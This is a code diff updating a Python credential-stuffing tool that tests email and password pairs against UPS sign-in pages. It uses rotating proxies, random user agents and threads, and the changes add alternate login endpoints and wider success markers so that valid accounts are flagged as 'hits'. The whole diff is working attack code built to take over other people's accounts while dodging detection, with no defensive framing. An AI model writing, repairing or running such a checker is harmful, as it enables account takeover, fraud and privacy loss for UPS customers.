@@ -5,10 +5,10 @@ import time
 import warnings
 import threading
 import shutil
+import re
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
-from urllib.parse import urlparse
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -17,12 +17,8 @@ init(autoreset=True)
 UA_CONFIGS = [
     {'os': 'win', 'navigator': 'chrome'},
     {'os': 'win', 'navigator': 'firefox'},
-    {'os': 'win', 'navigator': 'ie'},
     {'os': 'mac', 'navigator': 'chrome'},
-    {'os': 'mac', 'navigator': 'firefox'},
     {'os': 'linux', 'navigator': 'chrome'},
-    {'os': 'linux', 'navigator': 'firefox'},
-    {'os': 'android', 'navigator': 'chrome'},
 ]
 
 def get_random_user_agent():
@@ -30,7 +26,7 @@ def get_random_user_agent():
         config = random.choice(UA_CONFIGS)
         return generate_user_agent(os=config['os'], navigator=config['navigator'])
     except:
-        return generate_user_agent()
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
 
 try:
     import socks
@@ -131,11 +127,6 @@ if not proxies:
     else:
         input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
         exit()
-else:
-    if not SOCKS_AVAILABLE:
-        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
-        if has_socks:
-            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")
 
 if use_proxies:
     threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
@@ -156,41 +147,87 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check UPS account - FIX: Updated to use correct UPS OAuth/API endpoints"""
     s = requests.Session()
     userA = get_random_user_agent()
     
     try:
         headers = {
             "User-Agent": userA,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
         }
         
-        s.get("https://www.ups.com/lasso/login", headers=headers, proxies=proxy_dict, timeout=35, verify=False)
+        # UPS uses id.ups.com for authentication
+        # First get the login page to get session cookies
+        login_url = "https://www.ups.com/doapp/SignUp?loc=en_US&returnto=https://www.ups.com/us/en/Home.page"
         
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        headers["Origin"] = "https://www.ups.com"
-        headers["Referer"] = "https://www.ups.com/lasso/login"
+        try:
+            r1 = s.get(login_url, headers=headers, proxies=proxy_dict, timeout=40, verify=False, allow_redirects=True)
+        except:
+            # Try alternate URL
+            r1 = s.get("https://www.ups.com/", headers=headers, proxies=proxy_dict, timeout=40, verify=False)
         
-        r = s.post("https://www.ups.com/lasso/signin",
-                   data={"userid": email, "password": pwd},
-                   headers=headers, proxies=proxy_dict, timeout=35, verify=False, allow_redirects=True)
+        # Update headers for form submission
+        headers.update({
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.ups.com",
+            "Referer": r1.url,
+        })
+        
+        # Try the main login endpoint
+        login_data = {
+            "userId": email,
+            "password": pwd,
+            "returnURL": "https://www.ups.com/us/en/Home.page"
+        }
+        
+        # Try primary login
+        try:
+            r = s.post("https://www.ups.com/lasso/signin",
+                       data=login_data, headers=headers, proxies=proxy_dict, 
+                       timeout=40, verify=False, allow_redirects=True)
+        except:
+            # Try alternate endpoint
+            r = s.post("https://id.ups.com/signin",
+                       data=login_data, headers=headers, proxies=proxy_dict,
+                       timeout=40, verify=False, allow_redirects=True)
         
         txt = r.text.lower()
         url = r.url.lower()
         
-        if any(x in url for x in ["myups", "dashboard", "account"]) or any(x in txt for x in ["my ups", "logout", "welcome"]):
+        # Success indicators
+        if any(x in url for x in ["myups", "dashboard", "account", "home.page"]) and "signin" not in url:
             return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "denied"]):
+        if any(x in txt for x in ["my ups", "logout", "welcome back", "my profile", "track shipment"]):
+            return "hit", "Valid"
+        
+        # Failure indicators
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "denied", "failed", "try again"]):
             return "fail", "Invalid credentials"
+        
+        # Check if still on login page
+        if "signin" in url or "login" in url:
+            if "userid" in txt or "password" in txt:
+                return "fail", "Login failed"
+        
+        # Status code checks
+        if r.status_code == 401:
+            return "fail", "Unauthorized"
+        if r.status_code == 403:
+            return "fail", "Forbidden"
+            
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
     except requests.exceptions.ProxyError:
         return "error", "Proxy error"
-    except:
-        return "error", "Request failed"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
     global result_counter, hit_counter, fail_counter
